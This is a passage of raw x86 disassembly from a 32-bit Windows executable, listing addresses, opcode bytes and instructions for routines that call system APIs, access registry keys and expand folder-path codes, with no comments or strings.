  406178:	ff 15 30 92 40 00    	call   *0x409230
  40617e:	8b c8                	mov    %eax,%ecx
  406180:	be c0 61 47 00       	mov    $0x4761c0,%esi
  406185:	89 0d f8 61 47 00    	mov    %ecx,0x4761f8
  40618b:	83 7f 50 ff          	cmpl   $0xffffffff,0x50(%edi)
  40618f:	8b 3d 0c 92 40 00    	mov    0x40920c,%edi
  406195:	0f 84 80 00 00 00    	je     0x40621b
  40619b:	a1 14 62 47 00       	mov    0x476214,%eax
  4061a0:	56                   	push   %esi
  4061a1:	c7 05 c4 61 47 00 00 	movl   $0x401000,0x4761c4
  4061a8:	10 40 00 
  4061ab:	a3 d0 61 47 00       	mov    %eax,0x4761d0
  4061b0:	89 0d d4 61 47 00    	mov    %ecx,0x4761d4
  4061b6:	c7 05 e4 61 47 00 5c 	movl   $0x40a45c,0x4761e4
  4061bd:	a4 40 00 
  4061c0:	ff d7                	call   *%edi
  4061c2:	66 85 c0             	test   %ax,%ax
  4061c5:	75 07                	jne    0x4061ce
  4061c7:	33 c0                	xor    %eax,%eax
  4061c9:	e9 11 01 00 00       	jmp    0x4062df
  4061ce:	53                   	push   %ebx
  4061cf:	8d 44 24 14          	lea    0x14(%esp),%eax
  4061d3:	50                   	push   %eax
  4061d4:	53                   	push   %ebx
  4061d5:	6a 30                	push   $0x30
  4061d7:	ff 15 a0 91 40 00    	call   *0x4091a0
  4061dd:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4061e1:	2b 44 24 14          	sub    0x14(%esp),%eax
  4061e5:	53                   	push   %ebx
  4061e6:	ff 35 14 62 47 00    	push   0x476214
  4061ec:	53                   	push   %ebx
  4061ed:	53                   	push   %ebx
  4061ee:	50                   	push   %eax
  4061ef:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4061f3:	2b 44 24 24          	sub    0x24(%esp),%eax
  4061f7:	50                   	push   %eax
  4061f8:	ff 74 24 2c          	push   0x2c(%esp)
  4061fc:	ff 74 24 2c          	push   0x2c(%esp)
  406200:	68 00 00 00 80       	push   $0x80000000
  406205:	53                   	push   %ebx
  406206:	68 5c a4 40 00       	push   $0x40a45c
  40620b:	68 80 00 00 00       	push   $0x80
  406210:	ff 15 04 92 40 00    	call   *0x409204
  406216:	a3 50 1d 45 00       	mov    %eax,0x451d50
  40621b:	53                   	push   %ebx
  40621c:	e8 1b b3 ff ff       	call   0x40153c
  406221:	85 c0                	test   %eax,%eax
  406223:	0f 85 b3 00 00 00    	jne    0x4062dc
  406229:	e8 fd fc ff ff       	call   0x405f2b
  40622e:	39 1d 00 e3 47 00    	cmp    %ebx,0x47e300
  406234:	0f 85 89 00 00 00    	jne    0x4062c3
  40623a:	6a 05                	push   $0x5
  40623c:	ff 35 50 1d 45 00    	push   0x451d50
  406242:	ff 15 54 92 40 00    	call   *0x409254
  406248:	68 0c a4 40 00       	push   $0x40a40c
  40624d:	e8 22 05 00 00       	call   0x406774
  406252:	85 c0                	test   %eax,%eax
  406254:	75 0a                	jne    0x406260
  406256:	68 18 a4 40 00       	push   $0x40a418
  40625b:	e8 14 05 00 00       	call   0x406774
  406260:	56                   	push   %esi
  406261:	8b 35 94 92 40 00    	mov    0x409294,%esi
  406267:	68 24 a4 40 00       	push   $0x40a424
  40626c:	53                   	push   %ebx
  40626d:	ff d6                	call   *%esi
  40626f:	85 c0                	test   %eax,%eax
  406271:	75 1e                	jne    0x406291
  406273:	68 c0 61 47 00       	push   $0x4761c0
  406278:	68 3c a4 40 00       	push   $0x40a43c
  40627d:	53                   	push   %ebx
  40627e:	ff d6                	call   *%esi
  406280:	68 c0 61 47 00       	push   $0x4761c0
  406285:	c7 05 e4 61 47 00 24 	movl   $0x40a424,0x4761e4
  40628c:	a4 40 00 
  40628f:	ff d7                	call   *%edi
  406291:	a1 f4 61 47 00       	mov    0x4761f4,%eax
  406296:	53                   	push   %ebx
  406297:	68 0e 55 40 00       	push   $0x40550e
  40629c:	83 c0 69             	add    $0x69,%eax
  40629f:	53                   	push   %ebx
  4062a0:	0f b7 c0             	movzwl %ax,%eax
  4062a3:	50                   	push   %eax
  4062a4:	ff 35 14 62 47 00    	push   0x476214
  4062aa:	ff 15 f8 91 40 00    	call   *0x4091f8
  4062b0:	6a 05                	push   $0x5
  4062b2:	8b f0                	mov    %eax,%esi
  4062b4:	e8 83 b2 ff ff       	call   0x40153c
  4062b9:	55                   	push   %ebp
  4062ba:	e8 4d df ff ff       	call   0x40420c
  4062bf:	8b c6                	mov    %esi,%eax
  4062c1:	eb 1c                	jmp    0x4062df
  4062c3:	53                   	push   %ebx
  4062c4:	e8 2d fb ff ff       	call   0x405df6
  4062c9:	85 c0                	test   %eax,%eax
  4062cb:	74 1a                	je     0x4062e7
  4062cd:	39 1d 0c 62 47 00    	cmp    %ebx,0x47620c
  4062d3:	75 07                	jne    0x4062dc
  4062d5:	6a 02                	push   $0x2
  4062d7:	e8 60 b2 ff ff       	call   0x40153c
  4062dc:	6a 02                	push   $0x2
  4062de:	58                   	pop    %eax
  4062df:	5f                   	pop    %edi
  4062e0:	5e                   	pop    %esi
  4062e1:	5d                   	pop    %ebp
  4062e2:	5b                   	pop    %ebx
  4062e3:	83 c4 10             	add    $0x10,%esp
  4062e6:	c3                   	ret
  4062e7:	55                   	push   %ebp
  4062e8:	e8 4f b2 ff ff       	call   0x40153c
  4062ed:	e9 d5 fe ff ff       	jmp    0x4061c7
  4062f2:	56                   	push   %esi
  4062f3:	6a fe                	push   $0xfffffffe
  4062f5:	be 20 62 47 00       	mov    $0x476220,%esi
  4062fa:	56                   	push   %esi
  4062fb:	e8 91 01 00 00       	call   0x406491
  406300:	56                   	push   %esi
  406301:	ff 35 50 1d 45 00    	push   0x451d50
  406307:	ff 15 20 92 40 00    	call   *0x409220
  40630d:	8b c6                	mov    %esi,%eax
  40630f:	5e                   	pop    %esi
  406310:	c3                   	ret
  406311:	83 ec 3c             	sub    $0x3c,%esp
  406314:	55                   	push   %ebp
  406315:	8b 2d 08 62 47 00    	mov    0x476208,%ebp
  40631b:	85 ed                	test   %ebp,%ebp
  40631d:	0f 84 cb 00 00 00    	je     0x4063ee
  406323:	53                   	push   %ebx
  406324:	8b 1d 14 e3 47 00    	mov    0x47e314,%ebx
  40632a:	56                   	push   %esi
  40632b:	57                   	push   %edi
  40632c:	8b fb                	mov    %ebx,%edi
  40632e:	be 78 9d 45 00       	mov    $0x459d78,%esi
  406333:	83 e7 01             	and    $0x1,%edi
  406336:	75 0a                	jne    0x406342
  406338:	ff 74 24 50          	push   0x50(%esp)
  40633c:	56                   	push   %esi
  40633d:	e8 4f 01 00 00       	call   0x406491
  406342:	56                   	push   %esi
  406343:	e8 7e 10 00 00       	call   0x4073c6
  406348:	8b 74 24 54          	mov    0x54(%esp),%esi
  40634c:	89 44 24 50          	mov    %eax,0x50(%esp)
  406350:	85 f6                	test   %esi,%esi
  406352:	74 23                	je     0x406377
  406354:	56                   	push   %esi
  406355:	e8 6c 10 00 00       	call   0x4073c6
  40635a:	03 44 24 50          	add    0x50(%esp),%eax
  40635e:	3d 00 80 00 00       	cmp    $0x8000,%eax
  406363:	0f 83 82 00 00 00    	jae    0x4063eb
  406369:	56                   	push   %esi
  40636a:	be 78 9d 45 00       	mov    $0x459d78,%esi
  40636f:	56                   	push   %esi
  406370:	e8 35 10 00 00       	call   0x4073aa
  406375:	eb 05                	jmp    0x40637c
  406377:	be 78 9d 45 00       	mov    $0x459d78,%esi
  40637c:	f6 c3 04             	test   $0x4,%bl
  40637f:	75 0d                	jne    0x40638e
  406381:	56                   	push   %esi
  406382:	ff 35 e8 61 47 00    	push   0x4761e8
  406388:	ff 15 20 92 40 00    	call   *0x409220
  40638e:	f6 c3 02             	test   $0x2,%bl
  406391:	75 46                	jne    0x4063d9
  406393:	33 db                	xor    %ebx,%ebx
  406395:	89 74 24 24          	mov    %esi,0x24(%esp)
  406399:	8b 35 64 92 40 00    	mov    0x409264,%esi
  40639f:	53                   	push   %ebx
  4063a0:	53                   	push   %ebx
  4063a1:	68 04 10 00 00       	push   $0x1004
  4063a6:	55                   	push   %ebp
  4063a7:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%esp)
  4063ae:	00 
  4063af:	ff d6                	call   *%esi
  4063b1:	2b c7                	sub    %edi,%eax
  4063b3:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  4063b7:	89 44 24 14          	mov    %eax,0x14(%esp)
  4063bb:	8d 44 24 10          	lea    0x10(%esp),%eax
  4063bf:	50                   	push   %eax
  4063c0:	53                   	push   %ebx
  4063c1:	b8 4d 10 00 00       	mov    $0x104d,%eax
  4063c6:	2b c7                	sub    %edi,%eax
  4063c8:	50                   	push   %eax
  4063c9:	55                   	push   %ebp
  4063ca:	ff d6                	call   *%esi
  4063cc:	53                   	push   %ebx
  4063cd:	ff 74 24 18          	push   0x18(%esp)
  4063d1:	68 13 10 00 00       	push   $0x1013
  4063d6:	55                   	push   %ebp
  4063d7:	ff d6                	call   *%esi
  4063d9:	85 ff                	test   %edi,%edi
  4063db:	74 0e                	je     0x4063eb
  4063dd:	8b 44 24 50          	mov    0x50(%esp),%eax
  4063e1:	33 c9                	xor    %ecx,%ecx
  4063e3:	66 89 0c 45 78 9d 45 	mov    %cx,0x459d78(,%eax,2)
  4063ea:	00 
  4063eb:	5f                   	pop    %edi
  4063ec:	5e                   	pop    %esi
  4063ed:	5b                   	pop    %ebx
  4063ee:	5d                   	pop    %ebp
  4063ef:	83 c4 3c             	add    $0x3c,%esp
  4063f2:	c2 08 00             	ret    $0x8
  4063f5:	56                   	push   %esi
  4063f6:	33 f6                	xor    %esi,%esi
  4063f8:	56                   	push   %esi
  4063f9:	ff 74 24 0c          	push   0xc(%esp)
  4063fd:	ff 15 84 90 40 00    	call   *0x409084
  406403:	85 c0                	test   %eax,%eax
  406405:	75 08                	jne    0x40640f
  406407:	ff 15 0c 91 40 00    	call   *0x40910c
  40640d:	8b f0                	mov    %eax,%esi
  40640f:	8b c6                	mov    %esi,%eax
  406411:	5e                   	pop    %esi
  406412:	c2 04 00             	ret    $0x4
  406415:	55                   	push   %ebp
  406416:	8b ec                	mov    %esp,%ebp
  406418:	83 ec 20             	sub    $0x20,%esp
  40641b:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  40641f:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406423:	6a 04                	push   $0x4
  406425:	58                   	pop    %eax
  406426:	66 89 45 e2          	mov    %ax,-0x1e(%ebp)
  40642a:	b8 10 a5 40 00       	mov    $0x40a510,%eax
  40642f:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  406432:	89 45 e8             	mov    %eax,-0x18(%ebp)
  406435:	8d 45 e0             	lea    -0x20(%ebp),%eax
  406438:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40643b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40643e:	50                   	push   %eax
  40643f:	ff 75 08             	push   0x8(%ebp)
  406442:	66 c7 45 e0 01 00    	movw   $0x1,-0x20(%ebp)
  406448:	c7 45 f0 00 a5 40 00 	movl   $0x40a500,-0x10(%ebp)
  40644f:	c7 45 f4 0c 00 00 00 	movl   $0xc,-0xc(%ebp)
  406456:	ff 15 84 90 40 00    	call   *0x409084
  40645c:	85 c0                	test   %eax,%eax
  40645e:	75 23                	jne    0x406483
  406460:	ff 15 0c 91 40 00    	call   *0x40910c
  406466:	3d b7 00 00 00       	cmp    $0xb7,%eax
  40646b:	75 20                	jne    0x40648d
  40646d:	8d 45 e0             	lea    -0x20(%ebp),%eax
  406470:	50                   	push   %eax
  406471:	68 07 00 00 80       	push   $0x80000007
  406476:	ff 75 08             	push   0x8(%ebp)
  406479:	ff 15 28 90 40 00    	call   *0x409028
  40647f:	85 c0                	test   %eax,%eax
  406481:	74 04                	je     0x406487
  406483:	33 c0                	xor    %eax,%eax
  406485:	eb 06                	jmp    0x40648d
  406487:	ff 15 0c 91 40 00    	call   *0x40910c
  40648d:	c9                   	leave
  40648e:	c2 04 00             	ret    $0x4
  406491:	8b 44 24 08          	mov    0x8(%esp),%eax
  406495:	83 ec 18             	sub    $0x18,%esp
  406498:	85 c0                	test   %eax,%eax
  40649a:	79 11                	jns    0x4064ad
  40649c:	8b 0d 00 62 47 00    	mov    0x476200,%ecx
  4064a2:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  4064a9:	2b c8                	sub    %eax,%ecx
  4064ab:	8b 01                	mov    (%ecx),%eax
  4064ad:	8b 0d 58 e2 47 00    	mov    0x47e258,%ecx
  4064b3:	33 d2                	xor    %edx,%edx
  4064b5:	53                   	push   %ebx
  4064b6:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  4064ba:	55                   	push   %ebp
  4064bb:	8d 2c 41             	lea    (%ecx,%eax,2),%ebp
  4064be:	b9 c0 e1 46 00       	mov    $0x46e1c0,%ecx
  4064c3:	57                   	push   %edi
  4064c4:	8b f9                	mov    %ecx,%edi
  4064c6:	3b d9                	cmp    %ecx,%ebx
  4064c8:	72 15                	jb     0x4064df
  4064ca:	8b c3                	mov    %ebx,%eax
  4064cc:	2b c1                	sub    %ecx,%eax
  4064ce:	d1 f8                	sar    $1,%eax
  4064d0:	3d 00 40 00 00       	cmp    $0x4000,%eax
  4064d5:	73 08                	jae    0x4064df
  4064d7:	8b fb                	mov    %ebx,%edi
  4064d9:	8b da                	mov    %edx,%ebx
  4064db:	89 5c 24 28          	mov    %ebx,0x28(%esp)
  4064df:	66 39 55 00          	cmp    %dx,0x0(%ebp)
  4064e3:	0f 84 f0 01 00 00    	je     0x4066d9
  4064e9:	56                   	push   %esi
  4064ea:	6a 02                	push   $0x2
  4064ec:	5e                   	pop    %esi
  4064ed:	8b c7                	mov    %edi,%eax
  4064ef:	8b dd                	mov    %ebp,%ebx
  4064f1:	2b c1                	sub    %ecx,%eax
  4064f3:	83 e0 fe             	and    $0xfffffffe,%eax
  4064f6:	3d 00 40 00 00       	cmp    $0x4000,%eax
  4064fb:	0f 8d d3 01 00 00    	jge    0x4066d4
  406501:	0f b7 55 00          	movzwl 0x0(%ebp),%edx
  406505:	03 ee                	add    %esi,%ebp
  406507:	6a 04                	push   $0x4
  406509:	58                   	pop    %eax
  40650a:	66 3b d0             	cmp    %ax,%dx
  40650d:	0f 83 a0 01 00 00    	jae    0x4066b3
  406513:	0f be 73 03          	movsbl 0x3(%ebx),%esi
  406517:	0f be 45 00          	movsbl 0x0(%ebp),%eax
  40651b:	83 e6 7f             	and    $0x7f,%esi
  40651e:	0f b6 4d 00          	movzbl 0x0(%ebp),%ecx
  406522:	83 e0 7f             	and    $0x7f,%eax
  406525:	c1 e6 07             	shl    $0x7,%esi
  406528:	0b f0                	or     %eax,%esi
  40652a:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  40652e:	8b c1                	mov    %ecx,%eax
  406530:	0d 00 80 00 00       	or     $0x8000,%eax
  406535:	89 44 24 18          	mov    %eax,0x18(%esp)
  406539:	0f b6 45 01          	movzbl 0x1(%ebp),%eax
  40653d:	8d 6b 04             	lea    0x4(%ebx),%ebp
  406540:	89 44 24 24          	mov    %eax,0x24(%esp)
  406544:	0d 00 80 00 00       	or     $0x8000,%eax
  406549:	6a 02                	push   $0x2
  40654b:	89 44 24 24          	mov    %eax,0x24(%esp)
  40654f:	58                   	pop    %eax
  406550:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  406554:	66 3b d0             	cmp    %ax,%dx
  406557:	0f 85 fc 00 00 00    	jne    0x406659
  40655d:	83 3d e4 e2 47 00 00 	cmpl   $0x0,0x47e2e4
  406564:	6a 04                	push   $0x4
  406566:	5a                   	pop    %edx
  406567:	0f 45 c2             	cmovne %edx,%eax
  40656a:	84 c9                	test   %cl,%cl
  40656c:	79 3e                	jns    0x4065ac
  40656e:	8b 1d 58 e2 47 00    	mov    0x47e258,%ebx
  406574:	8b c1                	mov    %ecx,%eax
  406576:	83 e0 40             	and    $0x40,%eax
  406579:	83 e1 3f             	and    $0x3f,%ecx
  40657c:	50                   	push   %eax
  40657d:	57                   	push   %edi
  40657e:	8d 04 4b             	lea    (%ebx,%ecx,2),%eax
  406581:	50                   	push   %eax
  406582:	68 40 a5 40 00       	push   $0x40a540
  406587:	68 02 00 00 80       	push   $0x80000002
  40658c:	e8 7c 0c 00 00       	call   0x40720d
  406591:	8b 74 24 24          	mov    0x24(%esp),%esi
  406595:	33 db                	xor    %ebx,%ebx
  406597:	66 39 1f             	cmp    %bx,(%edi)
  40659a:	0f 85 a6 00 00 00    	jne    0x406646
  4065a0:	56                   	push   %esi
  4065a1:	57                   	push   %edi
  4065a2:	e8 ea fe ff ff       	call   0x406491
  4065a7:	e9 95 00 00 00       	jmp    0x406641
  4065ac:	83 f9 25             	cmp    $0x25,%ecx
  4065af:	75 0e                	jne    0x4065bf
  4065b1:	68 00 20 00 00       	push   $0x2000
  4065b6:	57                   	push   %edi
  4065b7:	ff 15 54 91 40 00    	call   *0x409154
  4065bd:	eb 7c                	jmp    0x40663b
  4065bf:	83 f9 24             	cmp    $0x24,%ecx
  4065c2:	75 0e                	jne    0x4065d2
  4065c4:	68 00 20 00 00       	push   $0x2000
  4065c9:	57                   	push   %edi
  4065ca:	ff 15 ac 90 40 00    	call   *0x4090ac
  4065d0:	eb 69                	jmp    0x40663b
  4065d2:	33 ed                	xor    %ebp,%ebp
  4065d4:	48                   	dec    %eax
  4065d5:	89 44 24 10          	mov    %eax,0x10(%esp)
  4065d9:	8b f0                	mov    %eax,%esi
  4065db:	a1 10 62 47 00       	mov    0x476210,%eax
  4065e0:	85 c0                	test   %eax,%eax
  4065e2:	74 13                	je     0x4065f7
  4065e4:	57                   	push   %edi
  4065e5:	55                   	push   %ebp
  4065e6:	55                   	push   %ebp
  4065e7:	ff 74 b4 24          	push   0x24(%esp,%esi,4)
  4065eb:	ff 35 18 62 47 00    	push   0x476218
  4065f1:	ff d0                	call   *%eax
  4065f3:	85 c0                	test   %eax,%eax
  4065f5:	74 40                	je     0x406637
  4065f7:	8d 44 24 30          	lea    0x30(%esp),%eax
  4065fb:	50                   	push   %eax
  4065fc:	ff 74 b4 1c          	push   0x1c(%esp,%esi,4)
  406600:	ff 35 18 62 47 00    	push   0x476218
  406606:	e8 b9 22 00 00       	call   0x4088c4
  40660b:	85 c0                	test   %eax,%eax
  40660d:	75 1b                	jne    0x40662a
  40660f:	57                   	push   %edi
  406610:	ff 74 24 34          	push   0x34(%esp)
  406614:	ff 15 80 91 40 00    	call   *0x409180
  40661a:	ff 74 24 30          	push   0x30(%esp)
  40661e:	8b f0                	mov    %eax,%esi
  406620:	ff 15 ac 92 40 00    	call   *0x4092ac
  406626:	85 f6                	test   %esi,%esi
  406628:	75 0d                	jne    0x406637
  40662a:	33 c0                	xor    %eax,%eax
  40662c:	66 89 07             	mov    %ax,(%edi)
  40662f:	8b 44 24 10          	mov    0x10(%esp),%eax
  406633:	85 c0                	test   %eax,%eax
  406635:	75 9d                	jne    0x4065d4
  406637:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  40663b:	8b 74 24 24          	mov    0x24(%esp),%esi
  40663f:	33 db                	xor    %ebx,%ebx
  406641:	66 39 1f             	cmp    %bx,(%edi)
  406644:	74 44                	je     0x40668a
  406646:	83 fe 1a             	cmp    $0x1a,%esi
  406649:	75 3f                	jne    0x40668a
  40664b:	68 98 a5 40 00       	push   $0x40a598
  406650:	57                   	push   %edi
  406651:	ff 15 6c 91 40 00    	call   *0x40916c
  406657:	eb 31                	jmp    0x40668a
  406659:	83 fa 03             	cmp    $0x3,%edx
  40665c:	75 34                	jne    0x406692
  40665e:	83 fe 1d             	cmp    $0x1d,%esi
  406661:	75 0e                	jne    0x406671
  406663:	ff 35 18 62 47 00    	push   0x476218
  406669:	57                   	push   %edi
  40666a:	e8 1e 07 00 00       	call   0x406d8d
  40666f:	eb 2f                	jmp    0x4066a0
  406671:	8b c6                	mov    %esi,%eax
  406673:	c1 e0 0e             	shl    $0xe,%eax
  406676:	05 00 f0 47 00       	add    $0x47f000,%eax
  40667b:	50                   	push   %eax
  40667c:	57                   	push   %edi
  40667d:	e8 2e 0d 00 00       	call   0x4073b0
  406682:	8d 46 eb             	lea    -0x15(%esi),%eax
  406685:	83 f8 07             	cmp    $0x7,%eax
  406688:	73 16                	jae    0x4066a0
  40668a:	57                   	push   %edi
  40668b:	e8 43 0f 00 00       	call   0x4075d3
  406690:	eb 0e                	jmp    0x4066a0
  406692:	83 fa 01             	cmp    $0x1,%edx
  406695:	75 09                	jne    0x4066a0
  406697:	f7 d6                	not    %esi
  406699:	56                   	push   %esi
  40669a:	57                   	push   %edi
  40669b:	e8 f1 fd ff ff       	call   0x406491
  4066a0:	57                   	push   %edi
  4066a1:	ff 15 8c 90 40 00    	call   *0x40908c
  4066a7:	6a 02                	push   $0x2
  4066a9:	03 c0                	add    %eax,%eax
  4066ab:	b9 c0 e1 46 00       	mov    $0x46e1c0,%ecx
  4066b0:	5e                   	pop    %esi
  4066b1:	eb 13                	jmp    0x4066c6
  4066b3:	75 0c                	jne    0x4066c1
  4066b5:	66 8b 45 00          	mov    0x0(%ebp),%ax
  4066b9:	8d 6b 04             	lea    0x4(%ebx),%ebp
  4066bc:	66 89 07             	mov    %ax,(%edi)
  4066bf:	eb 03                	jmp    0x4066c4
  4066c1:	66 89 17             	mov    %dx,(%edi)
  4066c4:	8b c6                	mov    %esi,%eax
  4066c6:	03 f8                	add    %eax,%edi
  4066c8:	33 c0                	xor    %eax,%eax
  4066ca:	66 39 45 00          	cmp    %ax,0x0(%ebp)
  4066ce:	0f 85 19 fe ff ff    	jne    0x4064ed
  4066d4:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  4066d8:	5e                   	pop    %esi
  4066d9:	33 c0                	xor    %eax,%eax
  4066db:	66 89 07             	mov    %ax,(%edi)
  4066de:	85 db                	test   %ebx,%ebx
  4066e0:	74 09                	je     0x4066eb
  4066e2:	51                   	push   %ecx
  4066e3:	53                   	push   %ebx
  4066e4:	e8 c7 0c 00 00       	call   0x4073b0
  4066e9:	eb 02                	jmp    0x4066ed
  4066eb:	8b c1                	mov    %ecx,%eax
  4066ed:	5f                   	pop    %edi
  4066ee:	5d                   	pop    %ebp
  4066ef:	5b                   	pop    %ebx
  4066f0:	83 c4 18             	add    $0x18,%esp
  4066f3:	c2 08 00             	ret    $0x8
  4066f6:	8b 54 24 04          	mov    0x4(%esp),%edx
  4066fa:	33 c0                	xor    %eax,%eax
  4066fc:	38 05 1c e3 47 00    	cmp    %al,0x47e31c
  406702:	56                   	push   %esi
  406703:	57                   	push   %edi
  406704:	8b 7c 24 10          	mov    0x10(%esp),%edi
  406708:	be 00 01 00 00       	mov    $0x100,%esi
  40670d:	0f 4c f0             	cmovl  %eax,%esi
  406710:	8b 07                	mov    (%edi),%eax
  406712:	a8 20                	test   $0x20,%al
  406714:	74 38                	je     0x40674e
  406716:	f7 c2 00 00 00 60    	test   $0x60000000,%edx
  40671c:	74 30                	je     0x40674e
  40671e:	53                   	push   %ebx
  40671f:	8b ca                	mov    %edx,%ecx
  406721:	bb 00 03 00 00       	mov    $0x300,%ebx
  406726:	c1 e9 15             	shr    $0x15,%ecx
  406729:	23 cb                	and    %ebx,%ecx
  40672b:	3b cb                	cmp    %ebx,%ecx
  40672d:	5b                   	pop    %ebx
  40672e:	75 0a                	jne    0x40673a
  406730:	8b ce                	mov    %esi,%ecx
  406732:	f7 d1                	not    %ecx
  406734:	23 0d 10 e3 47 00    	and    0x47e310,%ecx
  40673a:	25 ff fe ff ff       	and    $0xfffffeff,%eax
  40673f:	0b c1                	or     %ecx,%eax
  406741:	25 ff fd ff ff       	and    $0xfffffdff,%eax
  406746:	81 e2 ff ff ff 9f    	and    $0x9fffffff,%edx
  40674c:	eb 0d                	jmp    0x40675b
  40674e:	a9 00 00 10 00       	test   $0x100000,%eax
  406753:	74 06                	je     0x40675b
  406755:	0b 05 10 e3 47 00    	or     0x47e310,%eax
  40675b:	8b c8                	mov    %eax,%ecx
  40675d:	6a 00                	push   $0x0
  40675f:	81 e1 df ff ef ff    	and    $0xffefffdf,%ecx
  406765:	85 c6                	test   %eax,%esi
  406767:	58                   	pop    %eax
  406768:	89 0f                	mov    %ecx,(%edi)
  40676a:	0f 45 d0             	cmovne %eax,%edx
  40676d:	5f                   	pop    %edi
  40676e:	8b c2                	mov    %edx,%eax
  406770:	5e                   	pop    %esi
  406771:	c2 08 00             	ret    $0x8
  406774:	55                   	push   %ebp
  406775:	8b ec                	mov    %esp,%ebp
  406777:	81 ec 3c 02 00 00    	sub    $0x23c,%esp
  40677d:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  406783:	56                   	push   %esi
  406784:	be 04 01 00 00       	mov    $0x104,%esi
  406789:	56                   	push   %esi
  40678a:	50                   	push   %eax
  40678b:	ff 15 54 91 40 00    	call   *0x409154
  406791:	3b c6                	cmp    %esi,%eax
  406793:	5e                   	pop    %esi
  406794:	77 18                	ja     0x4067ae
  406796:	85 c0                	test   %eax,%eax
  406798:	74 14                	je     0x4067ae
  40679a:	03 c0                	add    %eax,%eax
  40679c:	66 83 bc 05 c2 fd ff 	cmpw   $0x5c,-0x23e(%ebp,%eax,1)
  4067a3:	ff 5c 
  4067a5:	74 09                	je     0x4067b0
  4067a7:	b9 ac 9a 40 00       	mov    $0x409aac,%ecx
  4067ac:	eb 07                	jmp    0x4067b5
  4067ae:	33 c0                	xor    %eax,%eax
  4067b0:	b9 ae 9a 40 00       	mov    $0x409aae,%ecx
  4067b5:	ff 75 08             	push   0x8(%ebp)
  4067b8:	51                   	push   %ecx
  4067b9:	8d 8d c4 fd ff ff    	lea    -0x23c(%ebp),%ecx
  4067bf:	03 c1                	add    %ecx,%eax
  4067c1:	68 3c ab 40 00       	push   $0x40ab3c
  4067c6:	50                   	push   %eax
  4067c7:	ff 15 68 92 40 00    	call   *0x409268
  4067cd:	83 c4 10             	add    $0x10,%esp
  4067d0:	8d 85 c4 fd ff ff    	lea    -0x23c(%ebp),%eax
  4067d6:	6a 08                	push   $0x8
  4067d8:	6a 00                	push   $0x0
  4067da:	50                   	push   %eax
  4067db:	ff 15 fc 90 40 00    	call   *0x4090fc
  4067e1:	c9                   	leave
  4067e2:	c2 04 00             	ret    $0x4
  4067e5:	55                   	push   %ebp
  4067e6:	8b ec                	mov    %esp,%ebp
  4067e8:	83 ec 1c             	sub    $0x1c,%esp
  4067eb:	eb 0a                	jmp    0x4067f7
  4067ed:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4067f0:	50                   	push   %eax
  4067f1:	ff 15 94 91 40 00    	call   *0x409194
  4067f7:	6a 01                	push   $0x1
  4067f9:	ff 75 08             	push   0x8(%ebp)
  4067fc:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4067ff:	ff 75 08             	push   0x8(%ebp)
  406802:	6a 00                	push   $0x0
  406804:	50                   	push   %eax
  406805:	ff 15 08 92 40 00    	call   *0x409208
  40680b:	85 c0                	test   %eax,%eax
  40680d:	75 de                	jne    0x4067ed
  40680f:	c9                   	leave
  406810:	c2 04 00             	ret    $0x4
  406813:	6a 05                	push   $0x5
  406815:	ff 74 24 0c          	push   0xc(%esp)
  406819:	ff 74 24 0c          	push   0xc(%esp)
  40681d:	ff 15 5c 91 40 00    	call   *0x40915c
  406823:	85 c0                	test   %eax,%eax
  406825:	75 0f                	jne    0x406836
  406827:	ff 74 24 08          	push   0x8(%esp)
  40682b:	ff 74 24 08          	push   0x8(%esp)
  40682f:	e8 a8 00 00 00       	call   0x4068dc
  406834:	59                   	pop    %ecx
  406835:	59                   	pop    %ecx
  406836:	ff 05 f0 e2 47 00    	incl   0x47e2f0
  40683c:	c2 08 00             	ret    $0x8
  40683f:	55                   	push   %ebp
  406840:	8b ec                	mov    %esp,%ebp
  406842:	81 ec 00 01 00 00    	sub    $0x100,%esp
  406848:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  40684e:	68 00 01 00 00       	push   $0x100
  406853:	50                   	push   %eax
  406854:	ff 75 0c             	push   0xc(%ebp)
  406857:	e8 e3 01 00 00       	call   0x406a3f
  40685c:	83 c4 0c             	add    $0xc,%esp
  40685f:	85 c0                	test   %eax,%eax
  406861:	74 12                	je     0x406875
  406863:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  406869:	50                   	push   %eax
  40686a:	ff 75 08             	push   0x8(%ebp)
  40686d:	ff 15 60 91 40 00    	call   *0x409160
  406873:	eb 02                	jmp    0x406877
  406875:	33 c0                	xor    %eax,%eax
  406877:	c9                   	leave
  406878:	c2 08 00             	ret    $0x8
  40687b:	55                   	push   %ebp
  40687c:	8b ec                	mov    %esp,%ebp
  40687e:	8d 45 10             	lea    0x10(%ebp),%eax
  406881:	50                   	push   %eax
  406882:	ff 75 08             	push   0x8(%ebp)
  406885:	e8 6c fe ff ff       	call   0x4066f6
  40688a:	85 c0                	test   %eax,%eax
  40688c:	75 05                	jne    0x406893
  40688e:	6a 06                	push   $0x6
  406890:	58                   	pop    %eax
  406891:	eb 17                	jmp    0x4068aa
  406893:	33 c9                	xor    %ecx,%ecx
  406895:	51                   	push   %ecx
  406896:	ff 75 14             	push   0x14(%ebp)
  406899:	51                   	push   %ecx
  40689a:	ff 75 10             	push   0x10(%ebp)
  40689d:	51                   	push   %ecx
  40689e:	51                   	push   %ecx
  40689f:	51                   	push   %ecx
  4068a0:	ff 75 0c             	push   0xc(%ebp)
  4068a3:	50                   	push   %eax
  4068a4:	ff 15 2c 90 40 00    	call   *0x40902c
  4068aa:	5d                   	pop    %ebp
  4068ab:	c2 10 00             	ret    $0x10
  4068ae:	55                   	push   %ebp
